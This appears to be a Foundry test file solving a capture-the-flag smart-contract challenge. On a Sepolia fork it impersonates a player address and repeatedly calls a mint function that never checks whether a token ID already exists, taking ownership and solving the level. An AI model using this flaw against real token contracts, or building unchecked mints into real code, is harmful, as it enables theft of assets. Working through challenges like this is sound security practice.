// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/Challenge.sol";
import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";

contract ChallengeTest is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    // The mint function doesn't check if the `tokenId` has been minted before
    // So any attacker can mint and claim the ownership
    // Simply run the mint function will pass the level
    function testExploit() public {
        address playerAddress = 0xac164FB38Aba31f5E4229DB8770E740a40BAD51a;
        Challenge challenge = new Challenge(playerAddress);

        vm.startPrank(playerAddress);

        for (uint256 i = 0; i < 20; i++) {
            challenge.et().mint(playerAddress, i);
        }
        challenge.solve();

        vm.stopPrank();

        assertTrue(challenge.isSolved());
    }
}
